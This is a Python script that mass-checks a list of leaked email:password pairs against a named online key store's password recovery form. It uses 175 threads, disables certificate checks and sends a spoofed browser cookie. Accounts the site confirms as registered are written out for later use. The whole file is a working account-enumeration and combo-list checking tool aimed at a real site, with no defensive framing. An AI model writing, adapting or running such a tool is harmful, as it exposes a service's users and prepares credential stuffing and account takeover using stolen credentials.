# -*- coding: utf-8 -*-
import requests
import re
import Queue
import random
import codecs
from threading import Thread

requests.packages.urllib3.disable_warnings()

def check(q):
	s = requests.session()
	while True:
		try:
			c = q.get()
			user = c.split(':')[0]
			passw = c.split(':')[1]
			work = False
			s.cookies.clear()
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
				'Accept-Encoding': 'gzip',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Cookie': '__cfduid=d436ed4e00ffa157ac5bd3dc4762ff3d71475513657; store_language=en; eucl_cookie_access=1%2FY%2FY; RefererCookie=http%3A%2F%2Fwww.onlinekeystore.com%2Fhelp.php%3Fsection%3DPassword_Recovery; xid=966c266030d850273f3a4fbc36f50455'
			}
			r = s.post(
						'https://www.onlinekeystore.com/help.php',
						data='action=recover_password&email={0}'.format(user),
						verify=False,
						headers=headers
					)
			if 'An e-mail with your account information was mailed to ' in r.text:
				f = open("reg.txt", "a")
				f.write('{0}:{1}\n'.format(user, passw))
				f.close()
				print user, 'works!'
			else:
				print user, '__________________!'
			if 'Email address and login name do not match' in r.text:
				f = open("checked.txt", "a")
				f.write('{0}:{1}\n'.format(user, passw))
				f.close()
			q.task_done()
		except Exception, e:
			print e
	
def main():
	with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
		users = f.readlines()
	with codecs.open('checked.txt', 'r', encoding='utf-8') as f:
		checked = f.readlines()
		
	queue = Queue.Queue()
	
	for _ in range(int(175)):
		worker = Thread(target=check, args=(queue,))
		worker.start()
	for user in users:
		l = re.findall('^\d', user)
		if user not in checked and not l:
			if user.strip().split(':')[0].lower() not in ''.join(list(queue.queue)).lower():
				queue.put(user.strip())
			
if __name__ == '__main__':
	main()